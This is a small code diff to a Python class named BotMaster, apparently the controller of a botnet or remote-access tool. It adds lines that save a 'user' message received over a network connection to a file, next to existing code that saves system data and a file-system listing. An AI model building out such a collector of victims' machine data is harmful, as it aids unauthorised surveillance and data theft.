@@ -51,6 +51,9 @@ class BotMaster:
             with open('data.json', 'w') as fp:
                 json.dump(dict, fp, indent=4)
 
+            data = self.recv_msg(connection).decode(FORMAT)
+            with open('user.txt', 'w', encoding=FORMAT) as fp:
+                fp.write(data)
 
             data = self.recv_msg(connection).decode(FORMAT)
             with open('fileSystem.txt', 'w', encoding=FORMAT) as fp:
